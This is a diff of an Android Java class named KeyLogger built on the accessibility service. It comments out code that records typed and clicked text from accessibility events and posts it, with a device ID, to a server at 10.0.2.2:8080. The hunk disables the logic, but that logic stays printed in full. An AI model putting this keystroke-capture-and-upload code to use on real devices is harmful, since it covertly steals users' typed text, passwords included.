@@ -30,43 +30,43 @@ public class KeyLogger extends AccessibilityService {
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
 
-        String uuid = Helper.getUuid();
-        Date now = DateTimeHelper.getCurrentDay();
-        String accessibilityEvent = null;
-        String msg = null;
-
-        switch (event.getEventType()) {
-            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
-                accessibilityEvent = "TYPE_VIEW_TEXT_CHANGED";
-                msg = String.valueOf(event.getText());
-                break;
-            }
-            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
-                accessibilityEvent = "TYPE_VIEW_FOCUSED";
-                msg = String.valueOf(event.getText());
-                break;
-            }
-            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
-                accessibilityEvent = "TYPE_VIEW_CLICKED";
-                msg = String.valueOf(event.getText());
-                break;
-            }
-            default:
-        }
-
-        if (accessibilityEvent == null) {
-            return;
-        }
-
-        Log.i(LOG_TAG, msg);
-
-        KeyLog keyLog = new KeyLog();
-        keyLog.setUuid(uuid);
-        keyLog.setKeyLogDate(now);
-        keyLog.setAccessibilityEvent(accessibilityEvent);
-        keyLog.setMsg(msg);
-
-        sendLog("http://10.0.2.2:8080/keylog/save", keyLog);
+//        String uuid = Helper.getUuid();
+//        Date now = DateTimeHelper.getCurrentDay();
+//        String accessibilityEvent = null;
+//        String msg = null;
+//
+//        switch (event.getEventType()) {
+//            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
+//                accessibilityEvent = "TYPE_VIEW_TEXT_CHANGED";
+//                msg = String.valueOf(event.getText());
+//                break;
+//            }
+//            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
+//                accessibilityEvent = "TYPE_VIEW_FOCUSED";
+//                msg = String.valueOf(event.getText());
+//                break;
+//            }
+//            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
+//                accessibilityEvent = "TYPE_VIEW_CLICKED";
+//                msg = String.valueOf(event.getText());
+//                break;
+//            }
+//            default:
+//        }
+//
+//        if (accessibilityEvent == null) {
+//            return;
+//        }
+//
+//        Log.i(LOG_TAG, msg);
+//
+//        KeyLog keyLog = new KeyLog();
+//        keyLog.setUuid(uuid);
+//        keyLog.setKeyLogDate(now);
+//        keyLog.setAccessibilityEvent(accessibilityEvent);
+//        keyLog.setMsg(msg);
+//
+//        sendLog("http://10.0.2.2:8080/keylog/save", keyLog);
     }
 
     private Map<String, String> getMap(KeyLog keyLog) throws IllegalAccessException {
